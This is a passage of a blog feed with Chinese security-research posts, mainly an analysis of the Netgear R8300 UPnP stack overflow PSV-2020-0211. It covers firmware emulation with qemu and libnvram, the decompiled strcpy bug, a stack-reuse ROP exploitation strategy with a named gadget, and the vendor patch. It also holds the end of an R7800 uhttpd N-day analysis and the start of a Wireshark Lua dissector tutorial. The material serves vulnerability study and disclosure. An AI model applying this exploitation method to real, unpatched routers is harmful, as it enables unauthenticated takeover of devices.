class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="string">&#x27;-f&#x27;</span> option is used <span class="keyword">for</span> debugging easily</span> </span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-arm-static /usr/sbin/uhttpd -f -h /www -r R7800  -x /cgi-bin -t 80 -p 0.0.0.0:80 -C /etc/uhttpd.crt -K /etc/uhttpd.key -s 0.0.0.0:443</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> netstat -tlnp</span></span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State      </span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN  </span><br></pre></td></tr></table></figure><p>由于对<code>R7800</code>这款设备不太熟悉，不知道<code>url</code>的前缀，先直接访问<code>/</code>路径，并带上对应的<code>payload</code>，测试后发现并未成功，难道是没有触发对应的路径？然后在启动时加上<code>qemu</code>的<code>-g</code>选项，采用<code>gdb-multiarch</code>进行附加调试，分析发现在<code>uh_cgi_auth_check()</code>函数头部有一个判断没通过，如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __fastcall <span class="title">uh_cgi_auth_check</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// 经调试得到: 比较&quot;/start.htm&quot; 和&quot;/cgi-bin&quot;</span></span><br><span class="line">  v9 = strncasecmp(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(v6 + <span class="number">8</span>), *(<span class="keyword">const</span> <span class="keyword">char</span> **)(*(_DWORD *)(*(_DWORD *)(v4 + <span class="number">4104</span>) + <span class="number">32</span>) + <span class="number">4132</span>), v8);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在将<code>url</code>改为<code>/cgi-bin</code>后，浏览器成功地弹出了认证的对话框，之后在<code>gdb</code>中可以看到成功地到达了漏洞点。然而，命令执行完毕之后，本地还是没有生成<code>hello.txt</code>文件… (PS：尝试了多种payload无果，可能和基于<code>qemu user mode</code>仿真有关)</p><img data-src="images/gdb.png" style="zoom:100%"><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文从漏洞公告出发，通过固件版本差异分析，再到补丁比对，最终成功定位到漏洞，并结合静态分析和动态仿真的方式对漏洞进行了验证。整体上来说，思路算是完整的，也适用于分析其他的<code>N day</code>，区别在于整个过程中每一步的复杂程度不一样。</p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly9rYi5uZXRnZWFyLmNvbS8wMDAwNjE3NDAvU2VjdXJpdHktQWR2aXNvcnktZm9yLVVuYXV0aGVudGljYXRlZC1SZW1vdGUtQ29kZS1FeGVjdXRpb24tb24tUjc4MDAtUFNWLTIwMTktMDA3Ng==">Security Advisory for Unauthenticated Remote Code Execution on R7800, PSV-2019-0076<i class="fa fa-external-link-alt"></i></span></li></ul><br /><blockquote><p>本文首发于信安之路，文章链接：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvUVVyRXJPZ2FVY1FWaFF6NWZHaGNfdw==">https://mp.weixin.qq.com/s/QUrErOgaUcQVhQz5fGhc_w<i class="fa fa-external-link-alt"></i></span></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 补丁分析 </tag>
            
            <tag> netgear </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PSV-2020-0211:Netgear R8300 UPnP栈溢出漏洞分析</title>
      <link href="2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p><code>PSV-2020-0211</code>对应<code>Netgear</code> <code>R8300</code>型号路由器上的一个缓冲区溢出漏洞，<code>Netgear</code>官方在2020年7月31日发布了<span class="exturl" data-url="aHR0cHM6Ly9rYi5uZXRnZWFyLmNvbS8wMDAwNjIxNTgvU2VjdXJpdHktQWR2aXNvcnktZm9yLVByZS1BdXRoZW50aWNhdGlvbi1Db21tYW5kLUluamVjdGlvbi1vbi1SODMwMC1QU1YtMjAyMC0wMjEx">安全公告<i class="fa fa-external-link-alt"></i></span>，8月18日<code>SSD</code>公开了该漏洞的相关<span class="exturl" data-url="aHR0cHM6Ly9zc2QtZGlzY2xvc3VyZS5jb20vc3NkLWFkdmlzb3J5LW5ldGdlYXItbmlnaHRoYXdrLXI4MzAwLXVwbnBkLXByZWF1dGgtcmNlLw==">细节<i class="fa fa-external-link-alt"></i></span>。该漏洞存在于设备的<code>UPnP</code>服务中，由于在处理数据包时缺乏适当的长度校验，通过发送一个特殊的数据包可造成缓冲区溢出。利用该漏洞，未经认证的用户可实现任意代码执行，从而获取设备的控制权。</p><a id="more"></a><p>该漏洞本身比较简单，但漏洞的利用思路值得借鉴，下面通过搭建<code>R8300</code>设备的仿真环境来对该漏洞进行分析。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>根据官方发布的安全公告，在版本<code>V1.0.2.134</code>中修复了该漏洞，于是选取之前的版本<code>V1.0.2.130</code>进行分析。由于手边没有真实设备，打算借助<code>qemu</code>工具来搭建仿真环境。<span class="exturl" data-url="aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzEzMTE=">文章<i class="fa fa-external-link-alt"></i></span>通过<code>qemu system mode</code>的方式来模拟整个设备的系统，我个人更偏向于通过<code>qemu user mode</code>的方式来模拟单服务。当然，这两种方式可能都需要对环境进行修复，比如文件/目录缺失、<code>NVRAM</code>缺失等。</p><p>用<code>binwalk</code>对固件进行解压提取后，运行如下命令启动<code>UPnP</code>服务。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 添加`--strace`选项, 方便查看错误信息, 便于环境修复</span></span><br><span class="line">&lt;extracted squashfs-root&gt;$ sudo chroot . ./qemu-arm-static --strace ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><p>运行后提示如下错误，根据对应的目录结构，通过运行命令<code>mkdir -p tmp/var/run</code>解决。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">18336 open(&quot;/var/run/upnpd.pid&quot;,O_RDWR|O_CREAT|O_TRUNC,0666) = -1 errno=2 (No such file or directory)</span><br></pre></td></tr></table></figure><p>之后再次运行上述命令，提示大量的错误信息，均与<code>NVRAM</code>有关，该错误在进行<code>IoT</code>设备仿真时会经常遇到。<code>NVRAM</code>中保存了设备的一些配置信息，而程序运行时需要读取配置信息，由于缺少对应的外设，因此会报错。一种常见的解决方案是<code>&quot;劫持&quot;</code>与<code>NVRAM</code>读写相关的函数，通过软件的方式来提供相应的配置。</p><p>网上有很多类似的模拟<code>NVRAM</code>行为的库，我个人经常使用<code>Firmadyne</code>框架提供的<code>libnvram</code>库：支持很多常见的<code>api</code>，对很多嵌入式设备进行了适配，同时还会解析固件中默认的一些<code>NVRAM</code>配置，实现方式比较优雅。采用该库，往往只需要做很少的改动，甚至无需改动，就可以满足需求。</p><p>参考<code>libnvram</code>的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Zpcm1hZHluZS9saWJudnJhbQ==">文档<i class="fa fa-external-link-alt"></i></span>，编译后然后将其置于文件系统中的<code>firmadyne</code>路径下，然后通过<code>LD_PRELOAD</code>环境变量进行加载，命令如下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;extracted squashfs-root&gt;$ sudo chroot . ./qemu-arm-static --strace -E LD_PRELOAD=./firmadyne/libnvram.so.armel ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><p>运行后提示缺少某个键值对，在<code>libnvram/config.h</code>中添加对应的配置，编译后重复进行测试，直到程序成功运行起来即可，最终<code>libnvram/config.h</code>的变化如下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/config.h b/config.h</span><br><span class="line">index 9908414..6598eba 100644</span><br><span class="line">--- a/config.h</span><br><span class="line">+++ b/config.h</span><br><span class="line">@@ -50,8 +50,10 @@</span><br><span class="line">     ENTRY(&quot;sku_name&quot;, nvram_set, &quot;&quot;) \</span><br><span class="line">     ENTRY(&quot;wla_wlanstate&quot;, nvram_set, &quot;&quot;) \</span><br><span class="line">     ENTRY(&quot;lan_if&quot;, nvram_set, &quot;br0&quot;) \</span><br><span class="line">-    ENTRY(&quot;lan_ipaddr&quot;, nvram_set, &quot;192.168.0.50&quot;) \</span><br><span class="line">-    ENTRY(&quot;lan_bipaddr&quot;, nvram_set, &quot;192.168.0.255&quot;) \</span><br><span class="line">+    ENTRY(&quot;lan_ipaddr&quot;, nvram_set, &quot;192.168.200.129&quot;) \</span><br><span class="line">+    ENTRY(&quot;lan_bipaddr&quot;, nvram_set, &quot;192.168.200.255&quot;) \</span><br><span class="line">     ENTRY(&quot;lan_netmask&quot;, nvram_set, &quot;255.255.255.0&quot;) \</span><br><span class="line">     /* Set default timezone, required by multiple images */ \</span><br><span class="line">     ENTRY(&quot;time_zone&quot;, nvram_set, &quot;EST5EDT&quot;) \</span><br><span class="line">@@ -70,6 +72,10 @@</span><br><span class="line">     /* Used by &quot;DGND3700 Firmware Version 1.0.0.17(NA).zip&quot; (3425) to prevent crashes */ \</span><br><span class="line">     ENTRY(&quot;time_zone_x&quot;, nvram_set, &quot;0&quot;) \</span><br><span class="line">     ENTRY(&quot;rip_multicast&quot;, nvram_set, &quot;0&quot;) \</span><br><span class="line">-    ENTRY(&quot;bs_trustedip_enable&quot;, nvram_set, &quot;0&quot;)</span><br><span class="line">+    ENTRY(&quot;bs_trustedip_enable&quot;, nvram_set, &quot;0&quot;) \</span><br><span class="line">+    /* Used by Netgear router: enable upnpd log */ \</span><br><span class="line">+    ENTRY(&quot;upnpd_debug_level&quot;, nvram_set, &quot;3&quot;) \</span><br><span class="line">+    /* Used by &quot;Netgear R8300&quot; */ \</span><br><span class="line">+    ENTRY(&quot;hwrev&quot;, nvram_set, &quot;MP1T99&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 成功运行</span></span><br><span class="line">&lt;extracted squashfs-root&gt;$ sudo chroot . ./qemu-arm-static -E LD_PRELOAD=./firmadyne/libnvram.so.armel ./usr/sbin/upnpd</span><br><span class="line">nvram_get_buf: upnpd_debug_level</span><br><span class="line">sem_lock: Triggering NVRAM initialization!</span><br><span class="line">nvram_init: Initializing NVRAM...</span><br><span class="line"><span class="meta">#</span><span class="bash"> ... &lt;omit&gt;</span></span><br><span class="line">nvram_match: upnp_turn_on (1) ?= &quot;1&quot;</span><br><span class="line">nvram_match: true</span><br><span class="line">ssdp_http_method_check(203):</span><br><span class="line">ssdp_discovery_msearch(1007):</span><br><span class="line">ST = 20</span><br><span class="line">ssdp_check_USN(212)</span><br><span class="line">service:dial:1</span><br><span class="line">USER-AGENT: Google Chrome/84.0.4147.125 Windows</span><br></pre></td></tr></table></figure><h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>在<code>upnp_main()</code>中，在<code>(1)</code>处<code>recvfrom()</code>用来读取来自<code>socket</code>的数据，并将其保存在<code>v55</code>指向的内存空间中。在<code>(2)</code>调用<code>ssdp_http_method_check()</code>，传入该函数的第一个参数为<code>v55</code>，即指向接收的<code>socket</code>数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">upnp_main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v55[<span class="number">4</span>]; <span class="comment">// [sp+44h] [bp-20ECh]</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> ( (v20 &gt;&gt; (dword_C4580 &amp; <span class="number">0x1F</span>)) &amp; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v55[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      v28 = recvfrom(dword_C4580, v55, <span class="number">0x1FFF</span>u, <span class="number">0</span>, (struct sockaddr *)&amp;v63, (<span class="keyword">socklen_t</span> *)&amp;v71);     <span class="comment">// (1)</span></span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      <span class="keyword">if</span> ( v29 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v28 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// ...</span></span><br><span class="line">          <span class="keyword">if</span> ( acosNvramConfig_match(<span class="string">&quot;upnp_turn_on&quot;</span>, <span class="string">&quot;1&quot;</span>) )</span><br><span class="line">            ssdp_http_method_check( v55, (<span class="keyword">int</span>)&amp;v59, (<span class="keyword">unsigned</span> __int16)(HIWORD(v63) &lt;&lt; <span class="number">8</span>) | (<span class="keyword">unsigned</span> __int16)(HIWORD(v63) &gt;&gt; <span class="number">8</span>));   <span class="comment">// (2)</span></span><br><span class="line">           <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>在<code>ssdp_http_method_check()</code>中，在<code>(3)</code>处调用<code>strcpy()</code>进行数据拷贝，其中<code>v40</code>指向栈上的局部缓冲区，<code>v3</code>指向接收的<code>socket</code>数据。由于缺乏长度校验，当构造一个超长的数据包时，拷贝时会出现缓冲区溢出。</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">ssdp_http_method_check</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v40; <span class="comment">// [sp+24h] [bp-634h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a1;</span><br><span class="line">  <span class="comment">// ... </span></span><br><span class="line">  wrap_vprintf(<span class="number">3</span>, <span class="string">&quot;%s(%d):\n&quot;</span>, <span class="string">&quot;ssdp_http_method_check&quot;</span>, <span class="number">203</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dword_93AE0 == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)&amp;v40, v3);     <span class="comment">// (3) stack overflow</span></span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><code>upnpd</code>程序启用的缓解措施如下，可以看到仅启用了<code>NX</code>机制。另外，由于程序的加载基址为<code>0x8000</code>，故<code>.text</code>段地址的最高字节均为<code>\x00</code>，而在调用<code>strcpy()</code>时存在<code>NULL</code>字符截断的问题，因此在进行漏洞利用时需要想办法绕过<code>NULL</code>字符限制的问题。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> checksec --file ./upnpd</span></span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br></pre></td></tr></table></figure><p><code>SSD</code>公开的<span class="exturl" data-url="aHR0cHM6Ly9zc2QtZGlzY2xvc3VyZS5jb20vc3NkLWFkdmlzb3J5LW5ldGdlYXItbmlnaHRoYXdrLXI4MzAwLXVwbnBkLXByZWF1dGgtcmNlLw==">漏洞细节<i class="fa fa-external-link-alt"></i></span>中给出了一个方案：通过<code>stack reuse</code>的方式来绕过该限制。具体思路为，先通过<code>socket</code>发送第一次数据，往栈上填充相应的<code>rop payload</code>，同时保证不会造成程序崩溃；再通过<code>socket</code>发送第二次数据用于覆盖栈上的返回地址，填充的返回地址用来实现<code>stack pivot</code>，即劫持栈指针使其指向第一次发送的<code>payload</code>处，然后再复用之前的<code>payload</code>以完成漏洞利用。<code>SSD</code>公开的漏洞细节中的示意图如下。</p><img data-src="images/SSD_r8300_exploit_flow.png" style="zoom:90%"><p>实际上，由于<code>recvfrom()</code>函数与漏洞点<code>strcpy()</code>之间的路径比较短，栈上的数据不会发生太大变化，利用<code>stack reuse</code>的思路，只需发送一次数据即可完成利用，示意图如下。在调用<code>ssdp_http_method_check()</code>前，接收的<code>socket</code>数据包保存在<code>upnp_main()</code>函数内的局部缓冲区上，而在<code>ssdp_http_method_check()</code>内，当调用完<code>strcpy()</code>后，会复制一部分数据到该函数内的局部缓冲区上。通过覆盖栈上的返回地址，可劫持栈指针，使其指向<code>upnp_main()</code>函数内的局部缓冲区，复用填充的<code>rop gadgets</code>，从而完成漏洞利用。</p><img data-src="images/stack_frame_before_call_ssdp.png" style="zoom:70%"><img data-src="images/stack_frame_after_call_strcpy.png" style="zoom:70%"><p>另外在调用<code>strcpy()</code>后，在<code>(4)</code>处还调用了函数<code>sub_B60C()</code>。通过对应的汇编代码可知，在覆盖栈上的返回地址之前，也会覆盖<code>R7</code>指向的栈空间内容，之后<code>R7</code>作为参数传递给<code>sub_B60C()</code>。而在<code>sub_B60C()</code>中，会读取<code>R0</code>指向的栈空间中的内容，然后再将其作为参数传递给<code>strstr()</code>，这意味<code>[R0]</code>中的值必须为一个有效的地址。因此在覆盖返回地址的同时，还需要用一个有效的地址来填充对应的栈偏移处，保证函数在返回前不会出现崩溃。由于<code>libc</code>库对应的加载基址比较大，即其最高字节不为<code>\x00</code>，因此任意选取该范围内的一个不包含<code>\x00</code>的有效地址即可。</p><img data-src="images/call_sub_B60C.png" style="zoom:70%"><p>在解决了<code>NULL</code>字符截断的问题之后，剩下的部分就是寻找<code>rop gadgets</code>来完成漏洞利用了，相对比较简单。同样，<code>SSD</code>公开的<span class="exturl" data-url="aHR0cHM6Ly9zc2QtZGlzY2xvc3VyZS5jb20vc3NkLWFkdmlzb3J5LW5ldGdlYXItbmlnaHRoYXdrLXI4MzAwLXVwbnBkLXByZWF1dGgtcmNlLw==">漏洞细节<i class="fa fa-external-link-alt"></i></span>中也包含了完整的漏洞利用代码，其思路是通过调用<code>strcpy gadget</code>拼接出待执行的命令，并将其写到某个<code>bss</code>地址处，然后再调用<code>system gadget</code>执行对应的命令。</p><p>在给出的漏洞利用代码中，<code>strcpy gadget</code>执行的过程相对比较繁琐，经过分析后，在<code>upnpd</code>程序中找到了另一个更优雅的<code>strcpy gadget</code>，如下。借助该<code>gadget</code>，可以直接在数据包中发送待执行的命令，而无需进行命令拼接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0000B764 MOV             R0, R4  ; dest</span><br><span class="line">.text:0000B768 MOV             R1, SP  ; src</span><br><span class="line">.text:0000B76C BL              strcpy</span><br><span class="line">.text:0000B770 ADD             SP, SP, #0x400</span><br><span class="line">.text:0000B774 LDMFD           SP!, &#123;R4-R6,PC&#125;</span><br></pre></td></tr></table></figure><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p><code>Netgear</code> 官方在<code>R8300-V1.0.2.134_1.0.99</code>版本中修复该漏洞。函数<code>ssdp_http_method_check()</code>的相关伪代码如下，可以看到，在补丁中调用的是<code>strncpy()</code>而非原来的<code>strcpy()</code>，同时还对局部缓冲区<code>&amp;v40</code>进行了初始化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">ssdp_http_method_check</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> v40; <span class="comment">// [sp+24h] [bp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = a1;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;v40, <span class="number">0</span>, <span class="number">0x5DC</span>u);</span><br><span class="line">  v52 = <span class="number">32</span>;</span><br><span class="line">  sub_B814(<span class="number">3</span>, <span class="string">&quot;%s(%d):\n&quot;</span>, <span class="string">&quot;ssdp_http_method_check&quot;</span>, <span class="number">203</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dword_93AE0 == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v51 = &amp;v40;</span><br><span class="line">  <span class="built_in">strncpy</span>((<span class="keyword">char</span> *)&amp;v40, v3, <span class="number">0x5DB</span>u);<span class="comment">// patch</span></span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文通过搭建<code>Netgear</code>  <code>R8300</code>型号设备的仿真环境，对其<code>UPnP</code>服务中存在的缓冲区溢出漏洞进行了分析。漏洞本身比较简单，但漏洞利用却存在<code>NULL</code>字符截断的问题，<code>SSD</code>公开的漏洞细节中通过<code>stack reuse</code>的方式实现了漏洞利用，思路值得借鉴和学习。</p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly9rYi5uZXRnZWFyLmNvbS8wMDAwNjIxNTgvU2VjdXJpdHktQWR2aXNvcnktZm9yLVByZS1BdXRoZW50aWNhdGlvbi1Db21tYW5kLUluamVjdGlvbi1vbi1SODMwMC1QU1YtMjAyMC0wMjEx">Security Advisory for Pre-Authentication Command Injection on R8300, PSV-2020-0211<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9zc2QtZGlzY2xvc3VyZS5jb20vc3NkLWFkdmlzb3J5LW5ldGdlYXItbmlnaHRoYXdrLXI4MzAwLXVwbnBkLXByZWF1dGgtcmNlLw==">SSD Advisory – Netgear Nighthawk R8300 upnpd PreAuth RCE<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzEzMTE=">Netgear Nighthawk R8300 upnpd PreAuth RCE 分析与复现<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Zpcm1hZHluZS9saWJudnJhbQ==">Firmadyne libnvram<i class="fa fa-external-link-alt"></i></span></li></ul><br /><blockquote><p>本文首发于安全客，文章链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjE3NjA2">https://www.anquanke.com/post/id/217606<i class="fa fa-external-link-alt"></i></span></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
          <category> IoT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> netgear </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Create Wireshark Dissector in Lua</title>
      <link href="2020/09/03/Create-Wireshark-Dissector-in-Lua/"/>
      <url>2020/09/03/Create-Wireshark-Dissector-in-Lua/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在对嵌入式设备进行分析时，有时会遇到一些私有协议，由于缺少对应的解析插件，这些协议无法被<code>Wireshark</code>解析，从而以原始数据的形式呈现，不便于对协议的理解与分析。正好之前看到了介绍用<code>Lua</code>脚本编写<code>Wireshark</code>协议解析插件的<span class="exturl" data-url="aHR0cHM6Ly9taWthLXMuZ2l0aHViLmlvL3dpcmVzaGFyay9sdWEvZGlzc2VjdG9yLzIwMTcvMTEvMDQvY3JlYXRpbmctYS13aXJlc2hhcmstZGlzc2VjdG9yLWluLWx1YS0xLmh0bWw=">文章<i class="fa fa-external-link-alt"></i></span>，于是以群晖<code>NAS</code>设备中的某个私有协议为例，动手写了一个协议解析插件。</p><a id="more"></a><h3 id="协议简介"><a href="#协议简介" class="headerlink" title="协议简介"></a>协议简介</h3><p><code>Synology Assistant</code>是群晖提供的一个用于在局域网中发现和管理其设备的工具，其通过<code>9999/udp</code>端口来和<code>NAS</code>设备进行交互，在<code>Wireshark</code>捕获到的部分数据包示例如下。可以看到，由于该协议为私有协议，<code>Wireshark</code>中缺少对应的解析插件，故无法对其进行解析。</p><blockquote><p>根据该协议的作用，暂且称之为<code>syno_finder</code>协议。</p></blockquote><img data-src="images/syno_finder_pcap_example.png" style="zoom:80%"><p>通过对协议进行分析，以及对对应的程序进行逆向，得到<code>syno_finder</code>协议的格式如下。其中，协议最开始的8个字节固定为<code>\x12\x34\x56\x78\x53\x59\x4e\x4f</code>，后面部分可以看作是由一系列的<code>tlv</code>组成。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAGIC <span class="meta-string">&quot;\x12\x34\x56\x78\x53\x59\x4e\x4f&quot;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tlv</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    uint8 type;</span><br><span class="line">    uint8 length;</span><br><span class="line">    uint8 value[length];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在了解了协议的格式后，就可以开始编写对应的解析插件了。</p><h3 id="协议解析插件编写"><a href="#协议解析插件编写" class="headerlink" 